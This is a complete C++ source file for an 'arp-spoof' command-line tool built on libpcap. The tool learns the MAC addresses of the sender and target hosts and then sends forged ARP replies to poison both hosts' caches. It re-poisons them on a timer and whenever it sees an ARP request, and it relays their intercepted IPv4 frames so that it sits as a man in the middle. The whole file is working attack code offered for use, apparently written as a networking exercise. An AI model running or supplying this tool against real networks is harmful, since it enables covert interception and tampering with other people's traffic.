#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <ifaddrs.h>
#include <pcap.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <unistd.h>
#include <vector>

#ifdef __linux__
#include <netpacket/packet.h>
#elif defined(__APPLE__)
#include <net/if_dl.h>
#endif

#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

struct Flow {
	Ip senderIp;
	Mac senderMac;
	Ip targetIp;
	Mac targetMac;
	time_t senderInfectTime;
	time_t targetInfectTime;
};

void usage() {
	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1\n");
}

bool getMyMac(char* dev, Mac* mac) {
#ifdef __linux__
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0) {
		perror("socket");
		return false;
	}

	ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
		perror("ioctl SIOCGIFHWADDR");
		close(fd);
		return false;
	}

	*mac = Mac(reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data));
	close(fd);
	return true;
#else
	ifaddrs* ifap;
	if (getifaddrs(&ifap) != 0) {
		perror("getifaddrs");
		return false;
	}

	bool ok = false;
	for (ifaddrs* ifa = ifap; ifa != nullptr; ifa = ifa->ifa_next) {
		if (ifa->ifa_addr == nullptr) continue;
		if (strcmp(ifa->ifa_name, dev) != 0) continue;
		if (ifa->ifa_addr->sa_family != AF_LINK) continue;

		sockaddr_dl* sdl = reinterpret_cast<sockaddr_dl*>(ifa->ifa_addr);
		if (sdl->sdl_alen == Mac::Size) {
			*mac = Mac(reinterpret_cast<uint8_t*>(LLADDR(sdl)));
			ok = true;
			break;
		}
	}

	freeifaddrs(ifap);
	return ok;
#endif
}

bool getMyIp(char* dev, Ip* ip) {
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0) {
		perror("socket");
		return false;
	}

	ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

	if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
		perror("ioctl SIOCGIFADDR");
		close(fd);
		return false;
	}

	sockaddr_in* sin = reinterpret_cast<sockaddr_in*>(&ifr.ifr_addr);
	*ip = Ip(ntohl(sin->sin_addr.s_addr));
	close(fd);
	return true;
}

bool sendPacket(pcap_t* handle, const void* packet, int size) {
	if (pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), size) != 0) {
		fprintf(stderr, "pcap_sendpacket error: %s\n", pcap_geterr(handle));
		return false;
	}
	return true;
}

bool getMacByIp(pcap_t* handle, Mac myMac, Ip myIp, Ip ip, Mac* mac) {
	EthArpPacket packet;
	packet.eth_.dmac_ = Mac::broadcastMac();
	packet.eth_.smac_ = myMac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::Size;
	packet.arp_.pln_ = Ip::Size;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = myMac;
	packet.arp_.sip_ = htonl(myIp);
	packet.arp_.tmac_ = Mac::nullMac();
	packet.arp_.tip_ = htonl(ip);

	if (!sendPacket(handle, &packet, sizeof(packet))) return false;

	while (true) {
		pcap_pkthdr* header;
		const u_char* recvPacket;
		int res = pcap_next_ex(handle, &header, &recvPacket);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			fprintf(stderr, "pcap_next_ex error: %s\n", pcap_geterr(handle));
			return false;
		}
		if (header->caplen < sizeof(EthArpPacket)) continue;

		EthArpPacket* recv = (EthArpPacket*)recvPacket;
		if (ntohs(recv->eth_.type_) != EthHdr::Arp) continue;
		if (ntohs(recv->arp_.op_) != ArpHdr::Reply) continue;
		if (ntohl(recv->arp_.sip_) != ip) continue;

		*mac = recv->arp_.smac_;
		return true;
	}
}

bool infectOne(pcap_t* handle, Mac myMac, Mac dstMac, Ip fakeIp, Mac victimMac, Ip victimIp) {
	EthArpPacket packet;
	packet.eth_.dmac_ = dstMac;
	packet.eth_.smac_ = myMac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::Size;
	packet.arp_.pln_ = Ip::Size;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = myMac;
	packet.arp_.sip_ = htonl(fakeIp);
	packet.arp_.tmac_ = victimMac;
	packet.arp_.tip_ = htonl(victimIp);

	return sendPacket(handle, &packet, sizeof(packet));
}

bool infectSender(pcap_t* handle, Mac myMac, Flow* flow) {
	if (!infectOne(handle, myMac, flow->senderMac, flow->targetIp, flow->senderMac, flow->senderIp)) return false;
	flow->senderInfectTime = time(nullptr);
	return true;
}

bool infectTarget(pcap_t* handle, Mac myMac, Flow* flow) {
	if (!infectOne(handle, myMac, flow->targetMac, flow->senderIp, flow->targetMac, flow->targetIp)) return false;
	flow->targetInfectTime = time(nullptr);
	return true;
}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc % 2 != 0) {
		usage();
		return EXIT_FAILURE;
	}

	char* dev = argv[1];
	Mac myMac;
	Ip myIp;
	if (!getMyMac(dev, &myMac)) return EXIT_FAILURE;
	if (!getMyIp(dev, &myIp)) return EXIT_FAILURE;

	std::vector<Flow> flows;
	for (int i = 2; i < argc; i += 2) {
		Flow flow;
		flow.senderIp = Ip(argv[i]);
		flow.senderMac = Mac::nullMac();
		flow.targetIp = Ip(argv[i + 1]);
		flow.targetMac = Mac::nullMac();
		flow.senderInfectTime = 0;
		flow.targetInfectTime = 0;
		flows.push_back(flow);
	}

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 65536, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "pcap_open_live error: %s\n", errbuf);
		return EXIT_FAILURE;
	}

	printf("my mac=%s my ip=%s\n", std::string(myMac).c_str(), std::string(myIp).c_str());

	for (int i = 0; i < (int)flows.size(); i++) {
		if (!getMacByIp(handle, myMac, myIp, flows[i].senderIp, &flows[i].senderMac)) {
			pcap_close(handle);
			return EXIT_FAILURE;
		}
		if (!getMacByIp(handle, myMac, myIp, flows[i].targetIp, &flows[i].targetMac)) {
			pcap_close(handle);
			return EXIT_FAILURE;
		}

		printf("sender ip=%s sender mac=%s\n",
			std::string(flows[i].senderIp).c_str(),
			std::string(flows[i].senderMac).c_str());
		printf("target ip=%s target mac=%s\n",
			std::string(flows[i].targetIp).c_str(),
			std::string(flows[i].targetMac).c_str());
	}

	for (int i = 0; i < (int)flows.size(); i++) {
		if (!infectSender(handle, myMac, &flows[i])) {
			pcap_close(handle);
			return EXIT_FAILURE;
		}
		if (!infectTarget(handle, myMac, &flows[i])) {
			pcap_close(handle);
			return EXIT_FAILURE;
		}
		printf("infect sender=%s target=%s\n",
			std::string(flows[i].senderIp).c_str(),
			std::string(flows[i].targetIp).c_str());
		printf("infect target=%s sender=%s\n",
			std::string(flows[i].targetIp).c_str(),
			std::string(flows[i].senderIp).c_str());
	}

	while (true) {
		pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);

		if (res == 0) {
			time_t now = time(nullptr);
			for (int i = 0; i < (int)flows.size(); i++) {
				if (now - flows[i].senderInfectTime >= 5) {
					infectSender(handle, myMac, &flows[i]);
				}
				if (now - flows[i].targetInfectTime >= 5) {
					infectTarget(handle, myMac, &flows[i]);
				}
			}
			continue;
		}

		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			fprintf(stderr, "pcap_next_ex error: %s\n", pcap_geterr(handle));
			break;
		}

		if (header->caplen < sizeof(EthHdr)) continue;

		EthHdr* eth = (EthHdr*)packet;

		if (ntohs(eth->type_) == EthHdr::Arp) {
			if (header->caplen < sizeof(EthArpPacket)) continue;
			EthArpPacket* arp = (EthArpPacket*)packet;

			for (int i = 0; i < (int)flows.size(); i++) {
				bool recover = false;

				if (ntohs(arp->arp_.op_) == ArpHdr::Request &&
					ntohl(arp->arp_.sip_) == flows[i].senderIp &&
					ntohl(arp->arp_.tip_) == flows[i].targetIp &&
					arp->eth_.dmac_.isBroadcast()) {
					if (infectSender(handle, myMac, &flows[i])) {
						printf("reinfect sender=%s target=%s\n",
							std::string(flows[i].senderIp).c_str(),
							std::string(flows[i].targetIp).c_str());
					}
				}

				if (ntohs(arp->arp_.op_) == ArpHdr::Request &&
					ntohl(arp->arp_.sip_) == flows[i].targetIp &&
					ntohl(arp->arp_.tip_) == flows[i].senderIp &&
					arp->eth_.dmac_.isBroadcast()) {
					if (infectTarget(handle, myMac, &flows[i])) {
						printf("reinfect target=%s sender=%s\n",
							std::string(flows[i].targetIp).c_str(),
							std::string(flows[i].senderIp).c_str());
					}
				}

				if (recover) {}
			}

			continue;
		}

		if (ntohs(eth->type_) == EthHdr::Ip4) {
			for (int i = 0; i < (int)flows.size(); i++) {
				if (eth->smac_ == flows[i].senderMac && eth->dmac_ == myMac) {
					std::vector<u_char> relay(packet, packet + header->caplen);
					EthHdr* relayEth = (EthHdr*)relay.data();
					relayEth->smac_ = myMac;
					relayEth->dmac_ = flows[i].targetMac;

					if (sendPacket(handle, relay.data(), (int)relay.size())) {
						printf("relay sender=%s target=%s len=%u\n",
							std::string(flows[i].senderIp).c_str(),
							std::string(flows[i].targetIp).c_str(),
							header->caplen);
					}
					break;
				}

				if (eth->smac_ == flows[i].targetMac && eth->dmac_ == myMac) {
					std::vector<u_char> relay(packet, packet + header->caplen);
					EthHdr* relayEth = (EthHdr*)relay.data();
					relayEth->smac_ = myMac;
					relayEth->dmac_ = flows[i].senderMac;

					if (sendPacket(handle, relay.data(), (int)relay.size())) {
						printf("relay target=%s sender=%s len=%u\n",
							std::string(flows[i].targetIp).c_str(),
							std::string(flows[i].senderIp).c_str(),
							header->caplen);
					}
					break;
				}
			}
		}

		time_t now = time(nullptr);
		for (int i = 0; i < (int)flows.size(); i++) {
			if (now - flows[i].senderInfectTime >= 5) {
				infectSender(handle, myMac, &flows[i]);
			}
			if (now - flows[i].targetInfectTime >= 5) {
				infectTarget(handle, myMac, &flows[i]);
			}
		}
	}

	pcap_close(handle);
	return EXIT_SUCCESS;
}
